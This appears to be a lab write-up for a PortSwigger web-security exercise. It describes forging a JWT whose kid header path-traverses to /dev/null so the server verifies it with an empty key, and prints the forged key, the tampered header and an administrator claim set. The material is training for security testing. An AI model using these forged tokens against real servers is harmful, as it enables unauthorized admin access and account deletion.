In this lab you have to exploit the fact that static files could be used in the kid (key ID) of the JWT.

Predictable files on linux are built in and therefore perfect for 
this JWT attack method
These are some of the files:
/dev/null:                      This is a special file that discards all data written to it and returns an End Of File (EOF) if read.
/dev/zero:                      This file returns null bytes when read.
/dev/full:                      This file will always return a “disk full” message when you try to write to it, but will return nothing when you read from it.
/dev/random and /dev/urandom:   These files produce random bytes when read. The difference between the two lies in how they gather entropy for the generation of these random bytes.
/etc/passwd:                    This file contains basic user attributes, such as user ID, group ID, home directory, shell, etc.
/etc/hostname:                  This file contains the hostname of the system.
/etc/os-release:                This file contains information about the operating system.
/proc/cpuinfo:                  This file contains information about the CPU.
/proc/meminfo:                  This file contains information about memory usage.
/proc/version:                  This file contains version information about the Linux kernel, gcc, etc.

For this attack changing the kid of the JWT to one of these static files e.g. /dev/null allows the server to return null
as this file is empty

This means we can generate a Symmetric key with the AA== K value (this will base64 decode to null)
and allow for the server to get the okay for the administrator user to delete the user carlos

As clearly this is the administrator...

Here are the payloads used in this lab:

The Symmetric key generated by us and signed by us
{
    "kty": "oct",
    "kid": "1aa83e52-c89a-49b1-8810-44b2a89ab624",
    "k": "AA=="
}

the header of the tampered JWT:
{
    "kid": "../../../../../../../dev/null",
    "alg": "HS256"
}

The Payload of the tampered JWT:
{
    "iss": "portswigger",
    "exp": 1711492444,
    "sub": "administrator"
}
